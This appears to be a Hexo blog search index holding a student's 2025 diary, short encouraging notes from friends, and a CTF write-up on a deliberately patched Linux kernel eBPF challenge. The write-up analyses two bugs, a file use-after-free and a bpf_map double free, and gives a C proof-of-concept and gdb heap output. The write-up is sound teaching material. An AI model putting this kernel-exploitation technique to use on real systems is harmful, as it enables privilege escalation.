<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025小琐碎 (持续更新)</title>
      <link href="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/"/>
      <url>/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/</url>
      
        <content type="html"><![CDATA[<p>ps: 由于图片存储在 github 上，不开 vpn 可能会加载的非常慢甚至加载不出来</p><h2 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h2><p>你说的对，2025年一月一号我就开始放寒假了，由于放假的比较早，所以我打算在学校多呆个十几天再回去，顺便适应一下备战考研的感觉。  </p><p>在校期间失联了快三年的高中室友 lzx 来找我请我吃饭，吃饭期间聊了很多高中的往事以及在大学的三年干了什么。饭后 lzx 带我去他的学校参观，才发现我们两个学校直接的距离居然这么的近，走路大概就二十分钟就能到。  </p><p>大学同班同学充哥也在这个期间找我去徒步，原因是他在宿舍呆太久感觉要发霉了，想出去走走。然后他看到我的朋友圈发的那条步行十八公里（当时是我极度抑郁然后一个人出去散散心），觉得我能够和他一起去，所以就找了我。我两早上很早就起床出发，一直走到晚上，感觉充哥可以去当兼职导游了😆😆😆。  </p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/1.jpg" class="" title="我的图图呢">  <p>还有富哥学弟 saofeia 在回家前请我吃大餐😋  </p><p>这个月月底，大概在年初三的时候，就和家人自驾游去了小长江、高怡岭、蟒山。景色十分的好，就是有点高估自己，衣服穿的特别少，冷成冰块了🥶。</p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/2.jpg" class="" title="我的图图呢">  <h2 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h2><p>在家里备战考研，给数学折磨的头昏欲裂，每天早上都尽力早起，然后去骑车。</p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/3.jpg" class="" title="我的图图呢">  <p>回校前也陪家人去了一趟清远长隆森林公园。  </p><p>还有就是学弟和平时一直跟我说不可能找到女朋友的好兄弟都脱单了🥹  </p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/5.jpg" class="" title="我的图图呢">  <p>我感觉我找不到百分之一百的原因都来源于自己，平时都没怎么参加社交活动，三年下来和女生讲话的次数都不知道有没有超过十次😭，再加上今年要考研和自己本身也有一点社恐，感觉更加不可能找到了😭😭😭  </p><p>月底感谢龙哥给的机会，去了一趟杭州的阿里白帽大会，见到了超级多非常厉害的师傅😎  </p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/4.jpg" class="" title="我的图图呢">  <p>也去了一下三年前第一次来杭州住的酒店附近（西湖旁的银泰），发现一切都没怎么改变，变的是我🥹</p><p>同时在日本参加 seccon ctf final 的空白帮我带 EVA 的周边，十分的阿里嘎多(╹ڡ╹ )  </p><h2 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h2><p>这个月上来就送了我一个大惊喜，从杭州回来后的第一个星期一，打开教务系统发现我的编译原理课程设计成绩为 56 分🤡。这个项目我是非常认真的一行一行代码的写的，而且项目要求的内容我都进行了实现，身边很多同学代码都跑步起来的都过了，当场红温了。然后就马上在老师晚上上课的时候去找他把事情问清楚，原因是我的课程报道写的不怎么好。不是哥们，课程设计给分是只看报道不看项目的是吧😅，最后折腾了一整个星期才把分数给改过来，折磨！！！   </p><p>改分数后发现这个逼教务员还把我算进了重修班，而选课阶段早已结束，所以又要折腾半天去退课🤡  </p><p>和郭飞去看了《猫猫的奇幻漂流》，还是第一次在电影院看这么文艺的电影，不知道作者想表达什么，找个时间去看看这部电影的解说  </p><p>接下来就是国赛半决赛，这次比赛我是抱着三等奖的心态去的，我已经好久没有做常规 pwn 题了，而且也早忘记怎么 fix 了，队友是师弟，没有什么比赛经验，更别说 awdp 和 isw 了。结果早上的 awdp 我手快拿下了全场 pwn 最高分并带队伍拿下了 awdp 第二名，可是 web 0 break 0 fix 怎么回事😡😡，isw 也没有什么分，最后勉强混到一等奖。</p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/6.jpg" class="" title="我的图图呢">  <p>可是不知道为什么，拿了一等奖后我并没有感到高兴，内心毫无波澜，而队友却高兴的像个孩子一样，看来我是真的老了👴  </p><p>打完比赛后晚上回到宿舍发现发烧了，倒头就睡。第二天醒来发现头痛的裂开，然后又睡了一天。去年三到十二月之间好像没有感冒过一次，可是从十二月到现在好像已经发烧了最少五次了，感觉我的身体在这种极度高压以及极度忙碌的环境下要达到极限了😇😇😇。  </p><p>最近认识的很多和我一届的同学和联队的师傅都陆续拿到京东、字节的实习 offer，而我还在考这个逼研究生，真是废物啊……  </p><p>曾经的我很想读研，因为我发现我对二进制安全有着很大的兴趣，非常想更加深入的去了解、探索这一个领域。但随着身边的人逐渐拿到各大公司的 offer，我现在又特别的想去找一份好工作。这两件事情我都很想做，可是我能力有限，很难兼得。目前就是一直在内心里处于十分矛盾的状态，非常希望有师傅能够指点一下我🥹  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>致喜欢半夜 emo 的自己</title>
      <link href="/2025/03/09/emo/"/>
      <url>/2025/03/09/emo/</url>
      
        <content type="html"><![CDATA[<h2 id="By-Csome"><a href="#By-Csome" class="headerlink" title="By Csome"></a>By Csome</h2><p>emo干啥<br>对前途emo是吧<br>没必要<br>干就完了<br>哪有什么正确答案<br>你的人脉，你的朋友都是你的成就<br>多好</p><h2 id="By-eeee"><a href="#By-eeee" class="headerlink" title="By eeee"></a>By eeee</h2><p>把每天每周的事都记下来<br>什么事让你开心<br>让你难过<br>让你有成就感<br>今年一定改变</p><h2 id="By-pazuris"><a href="#By-pazuris" class="headerlink" title="By pazuris"></a>By pazuris</h2><p>极端功利主义的思考总是让我们忘却：生命的本质其实是一场历程</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态 2024 决赛: eBeepf</title>
      <link href="/2025/01/15/eBeepf/"/>
      <url>/2025/01/15/eBeepf/</url>
      
        <content type="html"><![CDATA[<h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>拟态决赛已经结束了有一段时间了，至于为什么要写这一篇博客是因为我发现当时我们在比赛时好像非预期了，而且非预期后题目难度大幅度下降，所以我觉得很有必要分享一下我们当时的做法。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>又是 linux kernel 没什么好说的，内核版本是 6.11.7  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">                           @@@@</span><br><span class="line">                           @@@</span><br><span class="line">                          @@@</span><br><span class="line">                        @@@@@</span><br><span class="line">             @@@     @@@@@@@@@@@    @@@@@</span><br><span class="line">       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">      @@+            +@@@@@@@@@@@@@</span><br><span class="line">      @%  +%%%@@@@@%*= <span class="comment">#@@@@@@@@@@@</span></span><br><span class="line">      @@@           -=%@@@@@@@@@@@@</span><br><span class="line">       @@@%        +<span class="comment">#@@@@@@@**%@@@@</span></span><br><span class="line">         @@@@@@@@@@%=   <span class="comment">#@++%  #@@</span></span><br><span class="line">          @@@:*@@@%-   +@*  *<span class="comment">#  #@@</span></span><br><span class="line">          @@<span class="comment">#:-#@@@@%==#@=  -**  #@@</span></span><br><span class="line">          @@@-:-+@@@@@@@@+   %<span class="comment">#=  @@</span></span><br><span class="line">           @@@=:::=*@@@@@@<span class="comment">##+=#+  %@@</span></span><br><span class="line">            @@@%=::::::-<span class="comment">#@@=  ###%@@@</span></span><br><span class="line">            @@@@@@@@@@@@@@@@@ <span class="comment">#   @@@</span></span><br><span class="line">            @@@   @@@@      @@@@@@@@</span><br><span class="line"></span><br><span class="line">Boot took 1.99 seconds</span><br><span class="line"></span><br><span class="line">/ $ <span class="built_in">uname</span> -r</span><br><span class="line">6.11.7</span><br></pre></td></tr></table></figure><p>附件给了一个 bee.patch  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">diff -r linux-6.11.7/include/uapi/linux/bpf.h linux-6.11.7.patched/include/uapi/linux/bpf.h</span><br><span class="line">960a961</span><br><span class="line">&gt; BPF_MAP_RESET_REF,</span><br><span class="line">diff -r linux-6.11.7/kernel/bpf/syscall.c linux-6.11.7.patched/kernel/bpf/syscall.c</span><br><span class="line">5690a5691,5711</span><br><span class="line">&gt; static int bpf_map_do_reset_ref(union bpf_attr *attr)</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;       int ufd = attr-&gt;map_fd;</span><br><span class="line">&gt;       struct bpf_map *map;</span><br><span class="line">&gt;       struct fd f;</span><br><span class="line">&gt;       f = fdget(ufd);</span><br><span class="line">&gt;       map = __bpf_map_get(f);</span><br><span class="line">&gt;       if (IS_ERR(map)) &#123;</span><br><span class="line">&gt;               fdput(f);</span><br><span class="line">&gt;               return PTR_ERR(map);</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       if (map-&gt;max_entries &gt; 60) &#123;</span><br><span class="line">&gt;               fdput(f);</span><br><span class="line">&gt;               return -EINVAL;</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       atomic64_set(&amp;map-&gt;refcnt, 1);</span><br><span class="line">&gt;       atomic64_set(&amp;map-&gt;sleepable_refcnt, 0);</span><br><span class="line">&gt;       fdput(f);</span><br><span class="line">&gt;       return 0;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">5825a5847,5849</span><br><span class="line">&gt; break;</span><br><span class="line">&gt; case BPF_MAP_RESET_REF:</span><br><span class="line">&gt; err = bpf_map_do_reset_ref(&amp;attr);</span><br></pre></td></tr></table></figure><p>可以看到出题人给内核的 bpf 模块加了一个新的功能，那么漏洞应该就在这里了。  </p><h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h2><p>fd 结构体的定义如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实就是 file 结构体再另外加了一个 flags 标志位  </p><p>fdget 会经过多层调用最终调用 __fget_light 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> fd <span class="title function_">fdget</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __to_fd(__fdget(fd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fdget 调用 __fdget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __fdget(<span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __fget_light(fd, FMODE_PATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__fdget 调用 __fget_light</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lightweight file lookup - no refcnt increment if fd table isn&#x27;t shared.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can use this instead of fget if you satisfy all of the following</span></span><br><span class="line"><span class="comment"> * conditions:</span></span><br><span class="line"><span class="comment"> * 1) You must call fput_light before exiting the syscall and returning control</span></span><br><span class="line"><span class="comment"> *    to userspace (i.e. you cannot remember the returned struct file * after</span></span><br><span class="line"><span class="comment"> *    returning to userspace).</span></span><br><span class="line"><span class="comment"> * 2) You must not call filp_close on the returned struct file * in between</span></span><br><span class="line"><span class="comment"> *    calls to fget_light and fput_light.</span></span><br><span class="line"><span class="comment"> * 3) You must not clone the current task in between the calls to fget_light</span></span><br><span class="line"><span class="comment"> *    and fput_light.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fput_needed flag returned by fget_light should be passed to the</span></span><br><span class="line"><span class="comment"> * corresponding fput_light.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> __fget_light(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">fmode_t</span> mask)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If another thread is concurrently calling close_fd() followed</span></span><br><span class="line"><span class="comment"> * by put_files_struct(), we must not observe the old table</span></span><br><span class="line"><span class="comment"> * entry combined with the new refcount - otherwise we could</span></span><br><span class="line"><span class="comment"> * return a file that is concurrently being freed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * atomic_read_acquire() pairs with atomic_dec_and_test() in</span></span><br><span class="line"><span class="comment"> * put_files_struct().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(atomic_read_acquire(&amp;files-&gt;count) == <span class="number">1</span>)) &#123;</span><br><span class="line">file = files_lookup_fd_raw(files, fd);</span><br><span class="line"><span class="keyword">if</span> (!file || unlikely(file-&gt;f_mode &amp; mask))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span>)file;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">file = __fget_files(files, fd, mask);</span><br><span class="line"><span class="keyword">if</span> (!file)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> FDPUT_FPUT | (<span class="type">unsigned</span> <span class="type">long</span>)file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意看这个 __fget_light 函数，该函数用于根据文件描述符（fd）获取对应的文件结构体 struct file，但是它有一些限制条件，使得它的使用比标准的文件获取函数 fget 更加轻量级。以下是代码的主要功能和步骤的解释：<br>函数先通过 files_struct *files &#x3D; current-&gt;files 获取当前进程的文件描述符表，如果当前进程的文件描述符表引用计数为 1 (atomic_read_acquire(&amp;files-&gt;count) &#x3D;&#x3D; 1)，说明没有其他线程正在操作这个文件描述符表，可以执行轻量级的查找，直接调用 files_lookup_fd_raw 在文件描述符表中查找对应的文件结构体 struct file。  </p><p>如果文件描述符表的引用计数不为 1 (atomic_read_acquire(&amp;files-&gt;count) !&#x3D; 1)，说明可能有线程正在操作这个表，此时需要执行更重量级的查找，即调用 __fget_files_rcu 函数，如果读者这个函数的具体功能感兴趣的话可以自行去看<a href="https://elixir.bootlin.com/linux/v6.11.2/source/fs/file.c#L1026">源码</a>，正常情况下他会返回当前 fd 所指向的 file 结构体并将其 f_count 加一。在调用完 __fget_files 函数后会给 fd 结构体的 flags 标志位加上一个 FDPUT_FPUT。  </p><p>接下来是 fdput 函数，看这个函数名就感觉和 fput 功能很相识，其源码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">fdput</span><span class="params">(<span class="keyword">struct</span> fd fd)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fd.flags &amp; FDPUT_FPUT)</span><br><span class="line">fput(fd.file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其作用就是判断 fd 结构体的标志位是否存在 FDPUT_FPUT，如果存在则通过调用 fput 来令 file 结构体的 f_count 减一，而 FDPUT_FPUT 我们通过上面的分析可知需要利用多线程调用 __fget_light 才会给加上。  </p><p>__bpf_map_get 函数比较重要，其源码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* if error is returned, fd is released.</span></span><br><span class="line"><span class="comment"> * On success caller should complete fd access with matching fdput()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *__<span class="title">bpf_map_get</span>(<span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EBADF);</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_op != &amp;bpf_map_fops) &#123;</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> f.file-&gt;private_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__bpf_map_get 函数是用于获取 eBPF 映射的引用，该函数接收一个映射的文件描述符（eBPF 映射的文件描述符）作为参数，如果我们传入的文件描述符是一个普通的文件而不是 eBPF 的映射，那么 __bpf_map_get 就会调用 fdput 处理该 fd 结构体然后返回错误 -EINVAL。问题就出现在这个地方，我们再仔细看看这段 patch 的代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">        fdput(f);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 __bpf_map_get 返回错误的时候还会再次调用 fdput 再处理一次 f 对象，也就是说如果我们传入的是普通文件的文件描述符而不是 eBPF 映射的文件描述符，这段新增的 bpf 功能将会对这个 fd 结构体对象执行两次 fdput，而通过我们上面的分析，如果 fd 结构体的标志位有 FDPUT_FPUT 的话会执行 fput，这样就会造成 file uaf。<br>所以在这道题目中我们只需要再创建一个线程在这个新增的 bpf 模块中传入一个普通文件的文件描述符即可构造出 file uaf，有了 file uaf 之后打法就多样化了，当时我们的做法是用 dirty cred 构造文件越权写，这里就不再赘述。  </p><p>需要注意的是，在 linux kernel 6.12+ 之后这部分的代码发生了很大的改变，比如 __bpf_map_get 函数：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *__<span class="title">bpf_map_get</span>(<span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">if</span> (fd_empty(f))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EBADF);</span><br><span class="line"><span class="keyword">if</span> (unlikely(fd_file(f)-&gt;f_op != &amp;bpf_map_fops))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"><span class="keyword">return</span> fd_file(f)-&gt;private_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当传入的文件描述符不是 eBPF 映射的文件描述时不会再调用 fdput。  </p><p>这道题目的预期漏洞应该就是在 patch 文件最下面的这个地方：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atomic64_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">atomic64_set(&amp;<span class="built_in">map</span>-&gt;sleepable_refcnt, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这里手动的将 bpf_map 结构体中的 refcnt 对象设置为 0。当我们使用 close 函数关闭 eBPF 文件的映射的时候内核会将该文件对应的 bpf_map 结构体的 refcont 对象减一并判断 refcnt 的值是否为 0，如果为 0，则释放该 bpf_map 结构体。若我们能够令 refcnt 的值大于一然后调用这个新增的 bpf 模块，就能够构造出对同一个 bpf_map 结构体的多次释放。一个 double free 的 poc 如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line"><span class="type">int</span> inner_map = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="number">4</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (inner_map &lt; <span class="number">0</span>) err_exit(<span class="string">&quot;Failed to bpf_map_create for inner_map&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] inner_map: %d\n&quot;</span>, inner_map);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> outer_map = create_bpf_array_of_map(inner_map, <span class="number">4</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (outer_map &lt; <span class="number">0</span>) err_exit(<span class="string">&quot;Failed to bpf_map_create for outer_map&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] outer_map: %d\n&quot;</span>, outer_map);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] set inner_map.ref = 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bpf_map_update_elem(outer_map, &amp;key, &amp;inner_map, BPF_ANY) &lt; <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;Failed to bpf_map_update_elem&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] BUG set inner_map.ref = 1&quot;</span>);</span><br><span class="line">trigger(inner_map);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] close outer_map to free inner_mmap&#x27;s bpf_map object&quot;</span>);</span><br><span class="line"><span class="comment">// frist free bpf_map</span></span><br><span class="line">close(outer_map);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] try to close inner_map&quot;</span>);</span><br><span class="line"><span class="comment">// second free bpf_map</span></span><br><span class="line">trigger(inner_map);</span><br><span class="line">close(inner_map);</span><br></pre></td></tr></table></figure><p>此时在 gdb 中即可看到非常明显的 double free，这里使用了 <a href="https://github.com/bata24/gef">bata24&#x2F;gef</a> 这个插件，里面支持许多用于调试内核、各种类型的 heap 等指令，不过我不是很喜欢他的指令格式和 UI 界面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; slub-dump kmalloc<span class="number">-512</span> -n -q</span><br><span class="line">slab_caches @ <span class="number">0xffffffffa9562c80</span></span><br><span class="line"></span><br><span class="line">  kmem_cache: <span class="number">0xffff987801042a00</span></span><br><span class="line">    name: kmalloc<span class="number">-512</span></span><br><span class="line">    flags: <span class="number">0x10008</span> (SLAB_STORE_USER)</span><br><span class="line">    object size: <span class="number">0x200</span> (chunk size: <span class="number">0x200</span>)</span><br><span class="line">    offset (next pointer in chunk): <span class="number">0x100</span></span><br><span class="line">    red_left_pad: <span class="number">0x0</span></span><br><span class="line">    kmem_cache_cpu (cpu0): <span class="number">0xffff98780f632c20</span></span><br><span class="line">      active page: <span class="number">0xffffec9640078640</span></span><br><span class="line">        virtual address: <span class="number">0xffff987801e19000</span></span><br><span class="line">        num pages: <span class="number">1</span></span><br><span class="line">        in-use: <span class="number">6</span>/<span class="number">8</span></span><br><span class="line">        frozen: <span class="number">1</span></span><br><span class="line">        layout:   <span class="number">0x000</span> <span class="number">0xffff987801e19000</span> (next: <span class="number">0xffff987801e19000</span>: Corrupted (Loop detected))</span><br><span class="line">                  <span class="number">0x001</span> <span class="number">0xffff987801e19200</span> (in-use)</span><br><span class="line">                  <span class="number">0x002</span> <span class="number">0xffff987801e19400</span> (in-use)</span><br><span class="line">                  <span class="number">0x003</span> <span class="number">0xffff987801e19600</span> (in-use)</span><br><span class="line">                  <span class="number">0x004</span> <span class="number">0xffff987801e19800</span> (in-use)</span><br><span class="line">                  <span class="number">0x005</span> <span class="number">0xffff987801e19a00</span> (in-use)</span><br><span class="line">                  <span class="number">0x006</span> <span class="number">0xffff987801e19c00</span> (in-use)</span><br><span class="line">                  <span class="number">0x007</span> <span class="number">0xffff987801e19e00</span> (in-use)</span><br><span class="line">        freelist (fast path):</span><br><span class="line">                  <span class="number">0x000</span> <span class="number">0xffff987801e19000</span></span><br><span class="line">                        <span class="number">0xffff987801e19000</span>: Corrupted (Loop detected)</span><br><span class="line">        freelist (slow path): (none)</span><br><span class="line">    next: <span class="number">0xffff987801042900</span></span><br><span class="line">gef&gt;</span><br></pre></td></tr></table></figure><p>由于这个内核编译时没有开启 CONFIG_SLAB_FREELIST_HARDENED 选项所以可以直接连续释放同一个 object 两次，如果开启后可以提前申请一个大小为 0x200 的 pipe_buffer 数组，在第一次释放 bpf_map 后释放该数组然后再次释放 bpf_map 即可。  